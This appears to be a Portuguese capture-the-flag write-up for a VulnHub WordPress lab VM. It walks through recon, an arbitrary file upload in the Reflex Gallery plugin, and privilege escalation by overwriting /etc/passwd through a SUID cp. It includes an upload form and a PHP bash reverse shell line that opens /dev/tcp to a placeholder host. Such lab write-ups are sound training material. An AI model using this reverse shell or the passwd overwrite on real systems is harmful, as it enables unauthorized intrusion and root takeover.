---
title: Desafio 2 - VM 07
author: R3d-4rr0w
date: 2022-04-14 05:00:00 -0300
categories: [Desafio 2, Beco do Exploit, Writeups]
tags: [Desafio 2, Writeups, Linux, WordPress]
image: "/img/desafio2/becoxpl-logo.png"
alt: "Desafio2-VM7"
---

# VM 7 - Ha Hardy

---

## [VM 7 - Ha Hardy](https://www.vulnhub.com/entry/ha-wordy,363/)

---

## Reconhecimento:

NMAP

```bash
┌──(red_arrow㉿kali)-[~]
└─$ nmap -sV -Pn -v 192.168.56.10
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 16:00 EDT
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

No scan no nmap, só achamos a porta 80 aberta, que está rodando um Apache.

Ao abrir no browser,  vemos a página default do Apache.

<imr src ="/img/desafio2/vm7/hardy.png">

Vamos fazer uma enumeração de diretórios usando o FFUF.

Podemos ver que existe um wordpress rodando.

<imr src ="/img/desafio2/vm7/hardy 1.png">

<imr src ="/img/desafio2/vm7/hardy 2.png">

Olhando código fonte, vemos os plugins que o WordPress está usando.

Buscando por exploits, achamos um do reflex-gallery

<imr src ="/img/desafio2/vm7/hardy 3.png">

Olhando no diretório raiz do plugin, achamos o readme.txt.

<imr src ="/img/desafio2/vm7/hardy 4.png">

Dentro do readme.txt, vemos a versão do plugin, que é a 3.1.3.

<imr src ="/img/desafio2/vm7/hardy 5.png">

No searchsploit, existe um exploit para a versão que vimos acima.

<imr src ="/img/desafio2/vm7/hardy 6.png">

>**💡[WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload](https://www.exploit-db.com/exploits/36374)**


Dentro do exploit, fala do path para a exploração.

```bash
http://192.168.56.10/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php
```

Que ao ser acessado, retorna um erro dizendo que não tem arquivos carregados, então vemos que existe o serviço de upload e será possivel explorar.

<imr src ="/img/desafio2/vm7/hardy 7.png">

---

## Exploração do File Upload

Como não achamos o lugar para fazer o upload, no exploit tem o código de um formulário que poderemos usar para o isso.

```html
<form method="POST" action="http://192.168.56.10/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php" enctype="multipart/form-data" >
    <input type="file" name="qqfile"><br>
    <input type="submit" name="Submit" value="Pwn!">
</form>
```

Agora precisamos criar a reverse shell para enviar usando esse formulário.

Vamos usar uma shell simples que utiliza a função [exec()](https://www.php.net/manual/en/function.exec.php) do php.

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
?>
```

Vamos então abrir o formulário que criamos e fazer o upload da reverse shell no servidor alvo.

<imr src ="/img/desafio2/vm7/hardy 8.png">

<imr src ="/img/desafio2/vm7/hardy 9.png">

Ao abrir o path que armazena os arquivos carregados, que é citado no exploit, vemos o nosso arquivo.

<imr src ="/img/desafio2/vm7/hardy 10.png">

Agora vamos configurar o netcat para receber a conexão reversa e depois abrimos o código php que enviamos no browser, para termos acesso a reverse shell que enviamos.

<imr src ="/img/desafio2/vm7/hardy 11.png">

---

## Escalagem de Privilégio

Ao tentar ver os comandos que o usuário pode executar como root, usando o sudo -l, é pedida a senha do usuário, como não temos a senha vamos ver quais arquivos ele tem permissão para executar usando o find.

<imr src ="/img/desafio2/vm7/hardy 12.png">

Vemos acima que ele tem permissão de usar o /bin/cp e pode copiar arquivos como root.

Vamos usar para manipular o arquivo /etc/passwd e criar um novo usuario com privilégio elevado.

Primeiro iremos ler o arquivo /etc/passwd e copiar todo o contéudo, depois vamos criar um arquivo na nossa máquina com o mesmo nome /etc/passwd e inserir o nosso usuário seguindo o padrão utilizado pelo arquivo.

>**💡[Understanding /etc/passwd file fields](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)**


Para criar a senha, vamos usar o openssl e criar o hash no mesmo padrão do arquivo /etc/shadow que é usado no linux.

> **💡 [OpenSSL - PASSWD](https://www.openssl.org/docs/man1.1.1/man1/openssl-passwd.html)**


```bash
┌──(red_arrow㉿kali)-[~]
└─$ openssl passwd -1 -salt red-arrow frecha
```

Agora vamos inserir o usuario no arquivo, com os mesmos dados do root.

<imr src ="/img/desafio2/vm7/hardy 13.png">

Então vamos fazer o upload do arquivo que criamos para o alvo.

Podemos usar o mesmo formulario de upload.

<imr src ="/img/desafio2/vm7/hardy 14.png">

<imr src ="/img/desafio2/vm7/hardy 15.png">

<imr src ="/img/desafio2/vm7/hardy 16.png">

Podemos notar que ele está com o nome diferente, existe um ponto ( . ) no final do nome. 

Vamos copiar ele para criar um arquivo com o nome correto, sem o ponto.

<imr src ="/img/desafio2/vm7/hardy 17.png">

Agora vamos copiar o arquivo para a pasta /etc/ e substituir o original, pelo que tem o nosso usuário.

<imr src ="/img/desafio2/vm7/hardy 18.png">

Ao tentar trocar de usuário, ele da um erro, dizendo que o su precisa ser executado de um terminal.

<imr src ="/img/desafio2/vm7/hardy 19.png">

Vamos importar a shell interativa TTY, usando o python 3.

Agora podemos mudar para o nosso usuário com privilégio elevado.

<imr src ="/img/desafio2/vm7/hardy 20.png">

Podemos ver que temos acesso root.

<imr src ="/img/desafio2/vm7/hardy 21.png">

E dentro do diretório /root, temos a flag da VM.

<imr src ="/img/desafio2/vm7/hardy 22.png">